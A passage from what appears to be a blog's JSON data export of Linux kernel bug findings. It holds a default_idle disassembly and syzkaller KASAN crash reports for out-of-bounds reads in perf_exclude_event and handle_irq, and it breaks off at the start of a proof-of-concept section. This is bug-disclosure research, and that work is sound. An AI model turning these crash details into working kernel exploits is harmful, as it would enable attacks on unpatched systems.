<+54>:\tbt     QWORD PTR [rip+0xbf8b52],rax        # 0xffffffff82da56a0 <__cpu_online_mask>\n   0xffffffff821acb4e <+62>:\tjae    0xffffffff821acb38 <default_idle+40>\n   0xffffffff821acb50 <+64>:\tcall   0xffffffff8112fef0 <rcu_irq_enter_irqson>\n   0xffffffff821acb55 <+69>:\tinc    DWORD PTR gs:[rip+0x7de682b4]        # 0x14e10 <__preempt_count>\n   0xffffffff821acb5c <+76>:\tmov    rbx,QWORD PTR [rip+0xbad0a5]        # 0xffffffff82d59c08 <__tracepoint_cpu_idle+40>\n   0xffffffff821acb63 <+83>:\tcall   0xffffffff81124110 <debug_lockdep_rcu_enabled>\n   0xffffffff821acb68 <+88>:\ttest   eax,eax\n   0xffffffff821acb6a <+90>:\tje     0xffffffff821acb79 <default_idle+105>\n   0xffffffff821acb6c <+92>:\tcmp    BYTE PTR [rip+0xba8f9b],0x0        # 0xffffffff82d55b0e <__warned.41319>\n   0xffffffff821acb73 <+99>:\tje     0xffffffff821acc22 <default_idle+274>\n   0xffffffff821acb79 <+105>:\ttest   rbx,rbx\n   0xffffffff821acb7c <+108>:\tje     0xffffffff821acba1 <default_idle+145>\n   0xffffffff821acb7e <+110>:\tmov    rax,QWORD PTR [rbx]\n   0xffffffff821acb81 <+113>:\tmov    r12d,0xffffffff\n   0xffffffff821acb87 <+119>:\tmov    rdi,QWORD PTR [rbx+0x8]\n   0xffffffff821acb8b <+123>:\tadd    rbx,0x18\n   0xffffffff821acb8f <+127>:\tmov    edx,ebp\n   0xffffffff821acb91 <+129>:\tmov    esi,r12d\n   0xffffffff821acb94 <+132>:\tcall   0xffffffff82403000 <__x86_indirect_thunk_rax>\n   0xffffffff821acb99 <+137>:\tmov    rax,QWORD PTR [rbx]\n   0xffffffff821acb9c <+140>:\ttest   rax,rax\n   0xffffffff821acb9f <+143>:\tjne    0xffffffff821acb87 <default_idle+119>\n   0xffffffff821acba1 <+145>:\tdec    DWORD PTR gs:[rip+0x7de68268]        # 0x14e10 <__preempt_count>\n   0xffffffff821acba8 <+152>:\tpop    rbx\n   0xffffffff821acba9 <+153>:\tpop    rbp\n   0xffffffff821acbaa <+154>:\tpop    r12\n   0xffffffff821acbac <+156>:\tjmp    0xffffffff8112fa80 <rcu_irq_exit_irqson>\n   0xffffffff821acbb1 <+161>:\tmov    eax,DWORD PTR gs:[rip+0x7de62578]        # 0xf130 <cpu_number>\n   0xffffffff821acbb8 <+168>:\tmov    eax,eax\n   0xffffffff821acbba <+170>:\tbt     QWORD PTR [rip+0xbf8ade],rax        # 0xffffffff82da56a0 <__cpu_online_mask>\n   0xffffffff821acbc2 <+178>:\tjae    0xffffffff821acb20 <default_idle+16>\n   0xffffffff821acbc8 <+184>:\tcall   0xffffffff8112fef0 <rcu_irq_enter_irqson>\n   0xffffffff821acbcd <+189>:\tinc    DWORD PTR gs:[rip+0x7de6823c]        # 0x14e10 <__preempt_count>\n   0xffffffff821acbd4 <+196>:\tmov    rbx,QWORD PTR [rip+0xbad02d]        # 0xffffffff82d59c08 <__tracepoint_cpu_idle+40>\n   0xffffffff821acbdb <+203>:\tcall   0xffffffff81124110 <debug_lockdep_rcu_enabled>\n   0xffffffff821acbe0 <+208>:\ttest   eax,eax\n   0xffffffff821acbe2 <+210>:\tje     0xffffffff821acbed <default_idle+221>\n   0xffffffff821acbe4 <+212>:\tcmp    BYTE PTR [rip+0xba8f23],0x0        # 0xffffffff82d55b0e <__warned.41319>\n   0xffffffff821acbeb <+219>:\tje     0xffffffff821acc53 <default_idle+323>\n   0xffffffff821acbed <+221>:\ttest   rbx,rbx\n   0xffffffff821acbf0 <+224>:\tje     0xffffffff821acc11 <default_idle+257>\n   0xffffffff821acbf2 <+226>:\tmov    rax,QWORD PTR [rbx]\n   0xffffffff821acbf5 <+229>:\tmov    rdi,QWORD PTR [rbx+0x8]\n   0xffffffff821acbf9 <+233>:\tadd    rbx,0x18\n   0xffffffff821acbfd <+237>:\tmov    edx,ebp\n   0xffffffff821acbff <+239>:\tmov    esi,0x1\n   0xffffffff821acc04 <+244>:\tcall   0xffffffff82403000 <__x86_indirect_thunk_rax>\n   0xffffffff821acc09 <+249>:\tmov    rax,QWORD PTR [rbx]\n   0xffffffff821acc0c <+252>:\ttest   rax,rax\n   0xffffffff821acc0f <+255>:\tjne    0xffffffff821acbf5 <default_idle+229>\n   0xffffffff821acc11 <+257>:\tdec    DWORD PTR gs:[rip+0x7de681f8]        # 0x14e10 <__preempt_count>\n   0xffffffff821acc18 <+264>:\tcall   0xffffffff8112fa80 <rcu_irq_exit_irqson>\n   0xffffffff821acc1d <+269>:\tjmp    0xffffffff821acb20 <default_idle+16>\n   0xffffffff821acc22 <+274>:\tcall   0xffffffff811241a0 <rcu_read_lock_sched_held>\n   0xffffffff821acc27 <+279>:\ttest   eax,eax\n   0xffffffff821acc29 <+281>:\tjne    0xffffffff821acb79 <default_idle+105>\n   0xffffffff821acc2f <+287>:\tmov    rdx,0xffffffff82920580\n   0xffffffff821acc36 <+294>:\tmov    esi,0x28\n   0xffffffff821acc3b <+299>:\tmov    rdi,0xffffffff82925778\n   0xffffffff821acc42 <+306>:\tmov    BYTE PTR [rip+0xba8ec5],0x1        # 0xffffffff82d55b0e <__warned.41319>\n   0xffffffff821acc49 <+313>:\tcall   0xffffffff810f59ee <lockdep_rcu_suspicious>\n   0xffffffff821acc4e <+318>:\tjmp    0xffffffff821acb79 <default_idle+105>\n   0xffffffff821acc53 <+323>:\tcall   0xffffffff811241a0 <rcu_read_lock_sched_held>\n   0xffffffff821acc58 <+328>:\ttest   eax,eax\n   0xffffffff821acc5a <+330>:\tjne    0xffffffff821acbed <default_idle+221>\n   0xffffffff821acc5c <+332>:\tmov    rdx,0xffffffff82920580\n   0xffffffff821acc63 <+339>:\tmov    esi,0x28\n   0xffffffff821acc68 <+344>:\tmov    rdi,0xffffffff82925778\n   0xffffffff821acc6f <+351>:\tmov    BYTE PTR [rip+0xba8e98],0x1        # 0xffffffff82d55b0e <__warned.41319>\n   0xffffffff821acc76 <+358>:\tcall   0xffffffff810f59ee <lockdep_rcu_suspicious>\n   0xffffffff821acc7b <+363>:\tjmp    0xffffffff821acbed <default_idle+221>\nEnd of assembler dump.\n```\n\nCode :\n\n```c\n   0:   04 24                   add    al,0x24\n   2:   e8 12 ee ed fd          call   0xfffffffffdedee19\n   7:   48 8b 04 24             mov    rax,QWORD PTR [rsp]\n   b:   e9 d6 fe ff ff          jmp    0xfffffffffffffee6\n  10:   48 89 df                mov    rdi,rbx\n  13:   e8 01 ee ed fd          call   0xfffffffffdedee19\n  18:   eb 8a                   jmp    0xffffffffffffffa4\n  1a:   90                      nop\n  1b:   90                      nop\n  1c:   90                      nop\n  1d:   90                      nop\n  1e:   90                      nop\n  1f:   90                      nop\n  20:   90                      nop\n  21:   90                      nop\n  22:   90                      nop\n  23:   90                      nop\n  24:   90                      nop\n  25:   90                      nop\n  26:   90                      nop\n  27:   90                      nop\n  28:   90                      nop\n  29:   fb                      sti    \n  2a:   f4                      hlt    \n  2b:  *c3                      ret    \n  2c:   0f 1f 00                nop    DWORD PTR [rax]\n  2f:   66 2e 0f 1f 84 00 00    nop    WORD PTR cs:[rax+rax*1+0x0]\n  36:   00 00 00 \n  39:   f4                      hlt    \n  3a:   c3                      ret    \n  3b:   90                      nop\n  3c:   90                      nop\n  3d:   90                      nop\n  3e:   90                      nop\n  3f:   90                      nop\n```\n\nMaybe, in ```safe_halt()```, stuck for seconds because of ...\n\n**End**\n\n\n## perf_exclude_event - alloca Out Of Bounds\n\nGot from syzkaller & Found in LK v4.16.0-rc4.\n\n### Call Trace (Dump)\n\n```c\n[   45.867098] BUG: KASAN: alloca-out-of-bounds in perf_exclude_event+0x17e/0x190 kernel/events/core.c:7521\n[   45.867976] Read of size 8 at addr ffff880022efeae0 by task syz-executor7/7812\n[   45.868795] \n[   45.869000] CPU: 0 PID: 7812 Comm: syz-executor7 Not tainted 4.16.0-rc4 #6\n[   45.869791] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\n[   45.870801] Call Trace:\n[   45.871096]  <IRQ>\n[   45.871352]  dump_stack+0x127/0x213\n[   45.871771]  ? _atomic_dec_and_lock+0x18d/0x18d\n[   45.872299]  ? show_regs_print_info+0x12/0x12\n[   45.872816]  ? perf_exclude_event+0x17e/0x190\n[   45.873337]  print_address_description+0x60/0x22b\n[   45.873886]  ? perf_exclude_event+0x17e/0x190\n[   45.874407]  kasan_report.cold.6+0xac/0x2f4\n[   45.874913]  ? perf_exclude_event+0x17e/0x190\n[   45.875437]  ? perf_swevent_hrtimer+0x28c/0x500\n[   45.875970]  ? save_trace+0x300/0x300\n[   45.876399]  ? scsi_finish_command+0x611/0x810\n[   45.876920]  ? perf_iterate_ctx+0x420/0x420\n[   45.877439]  ? save_trace+0x300/0x300\n[   45.877870]  ? rcu_nmi_exit+0x742/0x970\n[   45.878333]  ? find_held_lock+0x33/0x1b0\n[   45.878824]  ? save_trace+0x300/0x300\n[   45.879328]  ? save_trace+0x300/0x300\n[   45.879918]  ? lock_acquire+0x4a0/0x4a0\n[   45.880438]  ? save_trace+0x300/0x300\n[   45.880882]  ? enqueue_hrtimer+0x171/0x500\n[   45.881373]  ? do_raw_spin_trylock+0x190/0x190\n[   45.881920]  ? save_trace+0x300/0x300\n[   45.882369]  ? __lock_is_held+0xad/0x140\n[   45.882860]  ? __hrtimer_run_queues+0x379/0x1000\n[   45.883414]  ? perf_iterate_ctx+0x420/0x420\n[   45.883907]  ? hrtimer_interrupt+0x10b/0x730\n[   45.884432]  ? hrtimer_init+0x430/0x430\n[   45.884889]  ? lock_downgrade+0x6d0/0x6d0\n[   45.885382]  ? rcu_read_lock_sched_held+0x102/0x120\n[   45.885958]  ? pvclock_read_flags+0x150/0x150\n[   45.886476]  ? __lock_is_held+0xad/0x140\n[   45.886952]  ? kvm_clock_read+0x21/0x30\n[   45.887423]  ? ktime_get_update_offsets_now+0x324/0x400\n[   45.888048]  ? do_timer+0x40/0x40\n[   45.888449]  ? save_trace+0x300/0x300\n[   45.888884]  ? rcu_read_lock_sched_held+0x102/0x120\n[   45.889470]  ? hpet_assign_irq+0x1e0/0x1e0\n[   45.889991]  ? hrtimer_interrupt+0x2e9/0x730\n[   45.890512]  ? smp_apic_timer_interrupt+0x14d/0x710\n[   45.891093]  ? smp_call_function_single_interrupt+0x660/0x660\n[   45.891778]  ? handle_edge_irq+0x322/0x840\n[   45.892270]  ? task_prio+0x50/0x50\n[   45.892695]  ? _raw_spin_unlock+0x1f/0x30\n[   45.893172]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[   45.893767]  ? apic_timer_interrupt+0xf/0x20\n[   45.894266]  </IRQ>\n[   45.894546]  ? crypto_shash_update+0x23d/0x2a0\n[   45.895075]  ? kasan_disable_current+0x20/0x20\n[   45.895627]  ? crypto_shash_update+0x24d/0x2a0\n[   45.896161]  ? ext4_inode_csum.isra.59+0x562/0xef0\n[   45.896726]  ? ext4_journalled_zero_new_buffers+0x4e0/0x4e0\n[   45.897421]  ? trace_hardirqs_on_thunk+0x1a/0x1c\n[   45.897974]  ? retint_kernel+0x10/0x10\n[   45.898434]  ? retint_kernel+0x10/0x10\n[   45.898917]  ? trace_hardirqs_on_thunk+0x1a/0x1c\n[   45.899470]  ? retint_kernel+0x10/0x10\n[   45.899925]  ? ext4_inode_csum_set+0x17c/0x370\n[   45.900450]  ? ext4_mark_iloc_dirty+0x1709/0x2cc0\n[   45.901030]  ? ext4_chunk_trans_blocks+0x20/0x20\n[   45.901578]  ? jbd2_journal_add_journal_head+0x3b0/0x560\n[   45.902205]  ? jbd2_write_access_granted.part.8+0x264/0x410\n[   45.902851]  ? jbd2_journal_write_metadata_buffer+0xf80/0xf80\n[   45.903498]  ? rcu_note_context_switch+0x710/0x710\n[   45.904022]  ? jbd2_journal_put_journal_head+0x3b1/0x54f\n[   45.904594]  ? jbd2_journal_get_write_access+0x6b/0xb0\n[   45.905153]  ? __ext4_journal_get_write_access+0x143/0x200\n[   45.905795]  ? ext4_mark_inode_dirty+0x220/0xac0\n[   45.906307]  ? ext4_dirty_inode+0x8d/0xb0\n[   45.906776]  ? ext4_expand_extra_isize+0x560/0x560\n[   45.907316]  ? __lock_is_held+0xad/0x140\n[   45.907857]  ? ext4_setattr+0x2a90/0x2a90\n[   45.908361]  ? __ext4_journal_start_sb+0x175/0x5d0\n[   45.908950]  ? ext4_dirty_inode+0x5b/0xb0\n[   45.909480]  ? ext4_journal_abort_handle.isra.4+0x250/0x250\n[   45.910212]  ? __lock_is_held+0xad/0x140\n[   45.910774]  ? ext4_setattr+0x2a90/0x2a90\n[   45.911330]  ? ext4_dirty_inode+0x8d/0xb0\n[   45.911855]  ? __mark_inode_dirty+0x798/0x1570\n[   45.912431]  ? redirty_tail+0x200/0x200\n[   45.912947]  ? preempt_schedule_common+0x1d/0x50\n[   45.913551]  ? _cond_resched+0x18/0x20\n[   45.914033]  ? filemap_fault+0x5bf/0x1c30\n[   45.914555]  ? mark_held_locks+0xc1/0x140\n[   45.915048]  ? retint_kernel+0x10/0x10\n[   45.915536]  ? trace_hardirqs_on_thunk+0x1a/0x1c\n[   45.916149]  ? retint_kernel+0x10/0x10\n[   45.916662]  ? current_kernel_time64+0x189/0x200\n[   45.917293]  ? current_kernel_time64+0x1a4/0x200\n[   45.917909]  ? generic_update_time+0x26a/0x430\n[   45.918426]  ? put_itimerspec64+0x2f0/0x2f0\n[   45.918923]  ? dentry_needs_remove_privs.part.24+0x60/0x60\n[   45.919546]  ? lock_acquire+0x1b3/0x4a0\n[   45.920005]  ? dentry_needs_remove_privs.part.24+0x60/0x60\n[   45.920639]  ? file_update_time+0x383/0x620\n[   45.921172]  ? current_time+0xc0/0xc0\n[   45.921646]  ? rcu_read_lock_sched_held+0x102/0x120\n[   45.922306]  ? rcu_sync_lockdep_assert+0x6f/0xb0\n[   45.922886]  ? __sb_start_write+0x171/0x2f0\n[   45.923421]  ? ext4_page_mkwrite+0x1db/0x1320\n[   45.923976]  ? futex_wake+0x6d0/0x6d0\n[   45.924411]  ? ext4_change_inode_journal_flag+0x3f0/0x3f0\n[   45.925015]  ? ext4_filemap_fault+0x75/0xa4\n[   45.925552]  ? __down_interruptible+0x700/0x700\n[   45.926145]  ? do_page_mkwrite+0x137/0x470\n[   45.926673]  ? __do_fault+0x3f0/0x3f0\n[   45.927169]  ? wake_up_page_bit+0x610/0x610\n[   45.927745]  ? __handle_mm_fault+0x448/0x3940\n[   45.928264]  ? __handle_mm_fault+0x1e62/0x3940\n[   45.928808]  ? vm_insert_mixed_mkwrite+0x30/0x30\n[   45.929363]  ? save_trace+0x300/0x300\n[   45.929839]  ? find_held_lock+0x33/0x1b0\n[   45.930336]  ? print_usage_bug+0x140/0x140\n[   45.930820]  ? exit_robust_list+0x290/0x290\n[   45.931322]  ? print_usage_bug+0x140/0x140\n[   45.931790]  ? print_usage_bug+0x140/0x140\n[   45.932317]  ? lock_acquire+0x4a0/0x4a0\n[   45.932748]  ? lock_acquire+0x4a0/0x4a0\n[   45.933213]  ? print_usage_bug+0x140/0x140\n[   45.933748]  ? do_raw_spin_trylock+0x190/0x190\n[   45.934293]  ? save_trace+0x300/0x300\n[   45.934742]  ? mark_held_locks+0xc1/0x140\n[   45.935224]  ? find_held_lock+0x33/0x1b0\n[   45.935695]  ? retint_kernel+0x10/0x10\n[   45.936147]  ? mark_held_locks+0xc1/0x140\n[   45.936623]  ? retint_kernel+0x10/0x10\n[   45.937106]  ? save_trace+0x300/0x300\n[   45.937611]  ? mark_held_locks+0xc1/0x140\n[   45.938192]  ? retint_kernel+0x10/0x10\n[   45.938672]  ? trace_hardirqs_on_thunk+0x1a/0x1c\n[   45.939215]  ? retint_kernel+0x10/0x10\n[   45.939611]  ? handle_mm_fault+0x15a/0x410\n[   45.940175]  ? __do_page_fault+0x672/0xe30\n[   45.940700]  ? mm_fault_error+0x360/0x360\n[   45.941258]  ? SyS_clock_settime+0x230/0x230\n[   45.941801]  ? async_page_fault+0x2f/0x50\n[   45.942153]  ? do_page_fault+0xc1/0x720\n[   45.942536]  ? __do_page_fault+0xe30/0xe30\n[   45.942955]  ? exit_to_usermode_loop+0x1c6/0x230\n[   45.943435]  ? syscall_return_slowpath+0x4e0/0x4e0\n[   45.943889]  ? syscall_return_slowpath+0x342/0x4e0\n[   45.944351]  ? retint_user+0x18/0x18\n[   45.944721]  ? async_page_fault+0x2f/0x50\n[   45.945180]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[   45.945734]  ? async_page_fault+0x2f/0x50\n[   45.946290]  ? async_page_fault+0x45/0x50\n[   45.946824] \n[   45.947035] The buggy address belongs to the page:\n[   45.947726] page:ffffea00008bbf80 count:0 mapcount:0 mapping:0000000000000000 index:0x0\n[   45.948791] flags: 0x100000000000000()\n[   45.949241] raw: 0100000000000000 0000000000000000 0000000000000000 00000000ffffffff\n[   45.950342] raw: 0000000000000000 dead000000000200 0000000000000000 0000000000000000\n[   45.951364] page dumped because: kasan: bad access detected\n[   45.952057] \n[   45.952367] Memory state around the buggy address:\n[   45.953002]  ffff880022efe980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n[   45.953821]  ffff880022efea00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n[   45.954860] >ffff880022efea80: 00 00 00 00 ca ca ca ca 02 cb cb cb cb cb cb cb\n[   45.955823]                                                        ^\n[   45.956398]  ffff880022efeb00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n[   45.957172]  ffff880022efeb80: 00 00 00 f1 f1 f1 f1 02 f2 f2 f2 f2 f2 f2 f2 00\n[   45.958089] ==================================================================\n[   45.958800] Disabling lock debugging due to kernel taint\n[   45.959376] Kernel panic - not syncing: panic_on_warn set ...\n[   45.959376] \n[   45.959999] CPU: 0 PID: 7812 Comm: syz-executor7 Tainted: G    B            4.16.0-rc4 #6\n[   45.960804] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\n[   45.961596] Call Trace:\n[   45.961811]  <IRQ>\n[   45.962030]  dump_stack+0x127/0x213\n[   45.962440]  ? _atomic_dec_and_lock+0x18d/0x18d\n[   45.962954]  panic+0x1f8/0x46f\n[   45.963226]  ? add_taint.cold.5+0x16/0x16\n[   45.963553]  ? add_taint+0x21/0x50\n[   45.963825]  ? perf_exclude_event+0x17e/0x190\n[   45.964222]  kasan_end_report+0x43/0x49\n[   45.964525]  kasan_report.cold.6+0xc8/0x2f4\n[   45.964911]  ? perf_exclude_event+0x17e/0x190\n[   45.965295]  ? perf_swevent_hrtimer+0x28c/0x500\n[   45.965795]  ? save_trace+0x300/0x300\n[   45.966188]  ? scsi_finish_command+0x611/0x810\n[   45.966716]  ? perf_iterate_ctx+0x420/0x420\n[   45.967079]  ? save_trace+0x300/0x300\n[   45.967399]  ? rcu_nmi_exit+0x742/0x970\n[   45.967797]  ? find_held_lock+0x33/0x1b0\n[   45.968138]  ? save_trace+0x300/0x300\n[   45.968501]  ? save_trace+0x300/0x300\n[   45.968824]  ? lock_acquire+0x4a0/0x4a0\n[   45.969160]  ? save_trace+0x300/0x300\n[   45.969534]  ? enqueue_hrtimer+0x171/0x500\n[   45.969893]  ? do_raw_spin_trylock+0x190/0x190\n[   45.970309]  ? save_trace+0x300/0x300\n[   45.970656]  ? __lock_is_held+0xad/0x140\n[   45.970999]  ? __hrtimer_run_queues+0x379/0x1000\n[   45.971508]  ? perf_iterate_ctx+0x420/0x420\n[   45.971873]  ? hrtimer_interrupt+0x10b/0x730\n[   45.972324]  ? hrtimer_init+0x430/0x430\n[   45.972663]  ? lock_downgrade+0x6d0/0x6d0\n[   45.973047]  ? rcu_read_lock_sched_held+0x102/0x120\n[   45.973472]  ? pvclock_read_flags+0x150/0x150\n[   45.973889]  ? __lock_is_held+0xad/0x140\n[   45.974284]  ? kvm_clock_read+0x21/0x30\n[   45.974686]  ? ktime_get_update_offsets_now+0x324/0x400\n[   45.975245]  ? do_timer+0x40/0x40\n[   45.975596]  ? save_trace+0x300/0x300\n[   45.976009]  ? rcu_read_lock_sched_held+0x102/0x120\n[   45.976572]  ? hpet_assign_irq+0x1e0/0x1e0\n[   45.976989]  ? hrtimer_interrupt+0x2e9/0x730\n[   45.977367]  ? smp_apic_timer_interrupt+0x14d/0x710\n[   45.977947]  ? smp_call_function_single_interrupt+0x660/0x660\n[   45.978485]  ? handle_edge_irq+0x322/0x840\n[   45.978808]  ? task_prio+0x50/0x50\n[   45.979078]  ? _raw_spin_unlock+0x1f/0x30\n[   45.979487]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[   45.979981]  ? apic_timer_interrupt+0xf/0x20\n[   45.980424]  </IRQ>\n[   45.980611]  ? crypto_shash_update+0x23d/0x2a0\n[   45.980950]  ? kasan_disable_current+0x20/0x20\n[   45.981380]  ? crypto_shash_update+0x24d/0x2a0\n[   45.981765]  ? ext4_inode_csum.isra.59+0x562/0xef0\n[   45.982281]  ? ext4_journalled_zero_new_buffers+0x4e0/0x4e0\n[   45.982830]  ? trace_hardirqs_on_thunk+0x1a/0x1c\n[   45.983316]  ? retint_kernel+0x10/0x10\n[   45.983706]  ? retint_kernel+0x10/0x10\n[   45.984134]  ? trace_hardirqs_on_thunk+0x1a/0x1c\n[   45.984642]  ? retint_kernel+0x10/0x10\n[   45.985038]  ? ext4_inode_csum_set+0x17c/0x370\n[   45.985499]  ? ext4_mark_iloc_dirty+0x1709/0x2cc0\n[   45.986034]  ? ext4_chunk_trans_blocks+0x20/0x20\n[   45.986437]  ? jbd2_journal_add_journal_head+0x3b0/0x560\n[   45.987001]  ? jbd2_write_access_granted.part.8+0x264/0x410\n[   45.987726]  ? jbd2_journal_write_metadata_buffer+0xf80/0xf80\n[   45.988386]  ? rcu_note_context_switch+0x710/0x710\n[   45.988941]  ? jbd2_journal_put_journal_head+0x3b1/0x54f\n[   45.989555]  ? jbd2_journal_get_write_access+0x6b/0xb0\n[   45.990150]  ? __ext4_journal_get_write_access+0x143/0x200\n[   45.990780]  ? ext4_mark_inode_dirty+0x220/0xac0\n[   45.991317]  ? ext4_dirty_inode+0x8d/0xb0\n[   45.991783]  ? ext4_expand_extra_isize+0x560/0x560\n[   45.992336]  ? __lock_is_held+0xad/0x140\n[   45.992794]  ? ext4_setattr+0x2a90/0x2a90\n[   45.993266]  ? __ext4_journal_start_sb+0x175/0x5d0\n[   45.993818]  ? ext4_dirty_inode+0x5b/0xb0\n[   45.994288]  ? ext4_journal_abort_handle.isra.4+0x250/0x250\n[   45.994930]  ? __lock_is_held+0xad/0x140\n[   45.995391]  ? ext4_setattr+0x2a90/0x2a90\n[   45.995860]  ? ext4_dirty_inode+0x8d/0xb0\n[   45.996326]  ? __mark_inode_dirty+0x798/0x1570\n[   45.996841]  ? redirty_tail+0x200/0x200\n[   45.997294]  ? preempt_schedule_common+0x1d/0x50\n[   45.997851]  ? _cond_resched+0x18/0x20\n[   45.998289]  ? filemap_fault+0x5bf/0x1c30\n[   45.998728]  ? mark_held_locks+0xc1/0x140\n[   45.999165]  ? retint_kernel+0x10/0x10\n[   45.999571]  ? trace_hardirqs_on_thunk+0x1a/0x1c\n[   46.000071]  ? retint_kernel+0x10/0x10\n[   46.000479]  ? current_kernel_time64+0x189/0x200\n[   46.000977]  ? current_kernel_time64+0x1a4/0x200\n[   46.001484]  ? generic_update_time+0x26a/0x430\n[   46.001959]  ? put_itimerspec64+0x2f0/0x2f0\n[   46.002414]  ? dentry_needs_remove_privs.part.24+0x60/0x60\n[   46.003026]  ? lock_acquire+0x1b3/0x4a0\n[   46.003463]  ? dentry_needs_remove_privs.part.24+0x60/0x60\n[   46.004050]  ? file_update_time+0x383/0x620\n[   46.004511]  ? current_time+0xc0/0xc0\n[   46.004927]  ? rcu_read_lock_sched_held+0x102/0x120\n[   46.005492]  ? rcu_sync_lockdep_assert+0x6f/0xb0\n[   46.006020]  ? __sb_start_write+0x171/0x2f0\n[   46.006505]  ? ext4_page_mkwrite+0x1db/0x1320\n[   46.007011]  ? futex_wake+0x6d0/0x6d0\n[   46.007444]  ? ext4_change_inode_journal_flag+0x3f0/0x3f0\n[   46.008083]  ? ext4_filemap_fault+0x75/0xa4\n[   46.008564]  ? __down_interruptible+0x700/0x700\n[   46.009079]  ? do_page_mkwrite+0x137/0x470\n[   46.009532]  ? __do_fault+0x3f0/0x3f0\n[   46.009938]  ? wake_up_page_bit+0x610/0x610\n[   46.010420]  ? __handle_mm_fault+0x448/0x3940\n[   46.010910]  ? __handle_mm_fault+0x1e62/0x3940\n[   46.011389]  ? vm_insert_mixed_mkwrite+0x30/0x30\n[   46.011915]  ? save_trace+0x300/0x300\n[   46.012341]  ? find_held_lock+0x33/0x1b0\n[   46.012772]  ? print_usage_bug+0x140/0x140\n[   46.013216]  ? exit_robust_list+0x290/0x290\n[   46.013701]  ? print_usage_bug+0x140/0x140\n[   46.014177]  ? print_usage_bug+0x140/0x140\n[   46.014634]  ? lock_acquire+0x4a0/0x4a0\n[   46.015048]  ? lock_acquire+0x4a0/0x4a0\n[   46.015463]  ? print_usage_bug+0x140/0x140\n[   46.015904]  ? do_raw_spin_trylock+0x190/0x190\n[   46.016383]  ? save_trace+0x300/0x300\n[   46.016784]  ? mark_held_locks+0xc1/0x140\n[   46.017230]  ? find_held_lock+0x33/0x1b0\n[   46.017678]  ? retint_kernel+0x10/0x10\n[   46.018163]  ? mark_held_locks+0xc1/0x140\n[   46.018618]  ? retint_kernel+0x10/0x10\n[   46.019038]  ? save_trace+0x300/0x300\n[   46.019464]  ? mark_held_locks+0xc1/0x140\n[   46.019913]  ? retint_kernel+0x10/0x10\n[   46.020311]  ? trace_hardirqs_on_thunk+0x1a/0x1c\n[   46.020782]  ? retint_kernel+0x10/0x10\n[   46.021192]  ? handle_mm_fault+0x15a/0x410\n[   46.021711]  ? __do_page_fault+0x672/0xe30\n[   46.022230]  ? mm_fault_error+0x360/0x360\n[   46.022738]  ? SyS_clock_settime+0x230/0x230\n[   46.023278]  ? async_page_fault+0x2f/0x50\n[   46.023782]  ? do_page_fault+0xc1/0x720\n[   46.024267]  ? __do_page_fault+0xe30/0xe30\n[   46.024782]  ? exit_to_usermode_loop+0x1c6/0x230\n[   46.025326]  ? syscall_return_slowpath+0x4e0/0x4e0\n[   46.025880]  ? syscall_return_slowpath+0x342/0x4e0\n[   46.026432]  ? retint_user+0x18/0x18\n[   46.026854]  ? async_page_fault+0x2f/0x50\n[   46.027320]  ? trace_hardirqs_off_thunk+0x1a/0x1c\n[   46.027912]  ? async_page_fault+0x2f/0x50\n[   46.028432]  ? async_page_fault+0x45/0x50\n[   46.029012] Dumping ftrace buffer:\n[   46.029472]    (ftrace buffer empty)\n[   46.029930] Kernel Offset: 0x25a00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)\n[   46.031275] Rebooting in 86400 seconds..\n```\n\n**End**\n\n","excerpt":"handle_irq - OOBs Call Trace (Dump) PoC funny, just one call, . do_irq - alloca Out Of Bounds Call Trace (Dump) PoC generated by syz-repro.…","fields":{"slug":"/2018-03-1-Founds/"},"frontmatter":{"date":"Mar 01, 2018","title":"Linux Kernel - 2018-03-1 Founds","tags":["Security","Linux-Kernel"],"update":"Mar 06, 2018"},"timeToRead":77}},{"node":{"rawMarkdownBody":"\n## handle_irq - OOBs\n\n### Call Trace (Dump)\n\n```c\nBUG: KASAN: alloca-out-of-bounds in handle_irq+0x218/0x2f3\nRead of size 8 at addr ffff88007b086240 by task syzkaller734473/2831\n\nCPU: 0 PID: 2831 Comm: syzkaller734473 Not tainted 4.16.0-rc3+ #2\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n <IRQ>\n dump_stack+0x127/0x213\n print_address_description+0x60/0x22b\n kasan_report.cold.6+0xac/0x2f4\n </IRQ>\n\nThe buggy address belongs to the page:\npage:ffffea0001ec2180 count:0 mapcount:0 mapping:0000000000000000 index:0xffff88007b087dd0\nflags: 0x500000000000000()\nraw: 0500000000000000 0000000000000000 ffff88007b087dd0 00000000ffffffff\nraw: 0000000000000000 dead000000000200 0000000000000000 0000000000000000\npage dumped because: kasan: bad access detected\n\nMemory state around the buggy address:\n ffff88007b086100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n ffff88007b086180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n>ffff88007b086200: 00 00 00 00 00 00 00 00 cb cb cb cb 00 00 00 00\n                                           ^\n ffff88007b086280: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n ffff88007b086300: 00 f1 f1 f1 f1 02 f2 f2 f2 f2 f2 f2 f2 00 00 00\n==================================================================\nKernel panic - not syncing: panic_on_warn set ...\n\nCPU: 0 PID: 2831 Comm: syzkaller734473 Tainted: G    B            4.16.0-rc3+ #2\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n <IRQ>\n dump_stack+0x127/0x213\n panic+0x1f8/0x46f\n kasan_end_report+0x43/0x49\n kasan_report.cold.6+0xc8/0x2f4\n </IRQ>\nDumping ftrace buffer:\n   (ftrace buffer empty)\nKernel Offset: 0x26800000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)\nRebooting in 86400 seconds..\n```\n\n### PoC\n\n```c\n#define _GNU_SOURCE\n\n#include <endian.h>\n#include <sys/syscall.h>\n#include <unistd.h>\n#include <errno.h>\n#include 